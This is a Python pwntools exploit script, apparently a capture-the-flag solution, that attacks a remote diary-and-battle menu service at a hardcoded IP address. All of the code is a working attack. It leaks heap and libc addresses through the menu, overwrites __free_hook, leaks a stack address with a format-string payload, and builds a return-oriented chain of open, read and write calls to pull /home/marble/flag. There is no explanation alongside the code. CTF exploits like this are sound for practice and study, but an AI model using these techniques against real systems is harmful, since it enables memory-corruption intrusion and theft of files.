from pwn import *
import sys
HOST = "52.79.122.206"
PORT = 9292
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('192.168.33.10',PORT)
def menu(c):
  s.recvuntil("[")
  s.sendline(str(c))
def diary(day, dat,save):
  s.recvuntil("[")
  s.sendline("3")
  s.recvuntil(":")
  s.sendline(str(day))
  s.recvuntil(":")
  s.send(dat)
  s.recvuntil(">")
  s.sendline(str(save))
def mod_diary(idx, dat):
  s.recvuntil("[")
  s.sendline("4")
  s.recvuntil(":")
  s.sendline(str(idx))
  s.recvuntil(":")
  s.send(dat)
def out(c):
  s.recvuntil("[")
  s.sendline(str(c))
def battle():
  s.recvuntil("[")
  s.sendline("2")
menu(1)
diary(1234,"\m",2)
out(5)
menu(1)
battle()
s.sendline("i")
(s.recvuntil("Exp: "))
heap = int(s.recv(14),10) - 0x670
print hex(heap)
s.sendline("x")
out(5)
menu(1)

diary(1234,p64(heap+0x668),1) # 0x0000000000020b11
mod_diary(21,p64(0x0000000000020b11))
mod_diary(11,p64(0x660+heap))
out(5)
menu(1)
battle()
s.sendline("i")
(s.recvuntil("Exp: "))
libc = int(s.recv(15),10) - 0x3c4b78
print hex(libc)
s.sendline("x")
free_hook = libc+0x3c67a8
diary(1234,p64(free_hook),1) 
mod_diary(21,p64(libc+0x55800))
raw_input('d')
diary(123,"%14$llx\x00/home/marble/flag\x00",2)
stack = int(s.recvuntil("S")[:-1],16)
print hex(stack)
diary(1234,p64(stack-0x128),1)
_open = libc+0x00F7030
_read = libc+0xF7250
_write = libc+0xF72B0
gadget1 = 0x0000000000021102 # pop rdi ; ret
gadget2 = 0x00000000001150c9 # pop rdx ; pop rsi ; ret
dat = p64(libc+gadget1)
dat += p64(heap+0x868)
dat += p64(libc+gadget2)
dat += p64(0)
dat += p64(0)
dat += p64(_open)
dat += p64(libc+gadget1)
dat += p64(int(sys.argv[1],10))
dat += p64(libc+gadget2)
dat += p64(0x100)
dat += p64(heap)
dat += p64(_read)
dat += p64(libc+gadget1)
dat += p64(1)
dat += p64(libc+gadget2)
dat += p64(0x100)
dat += p64(heap)
dat += p64(_write)

dat += p64(0xdeadbeef)
mod_diary(73,dat)
#s.sendline("A"*0x400)
s.interactive()
